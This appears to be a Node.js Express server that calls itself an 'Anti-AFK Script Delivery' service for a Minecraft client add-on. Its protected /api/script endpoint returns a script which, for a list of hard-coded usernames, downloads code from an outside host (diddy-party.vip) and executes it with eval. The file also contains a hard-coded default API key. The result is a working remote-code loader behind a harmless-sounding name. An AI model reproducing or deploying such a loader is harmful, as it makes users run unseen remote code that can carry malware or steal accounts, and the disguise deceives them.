const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-321',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для скрипта - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();

// Проверяем разрешенные имена
if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
    try {
        // Выполняем внешний скрипт - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
        eval(new java.util.Scanner(
            new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
            "UTF-8"
        ).useDelimiter("\\\\\A").next());
    } catch (e) {
        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
    }
} else {
    print("X");
}
})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Anti-AFK Server',
        version: '1.0.0'
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Anti-AFK Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('✅ Anti-AFK Server started on port', CONFIG.PORT);
    console.log('🔒 Protected endpoint: /api/script');
    console.log('🌐 Status endpoint: /api/status');
});
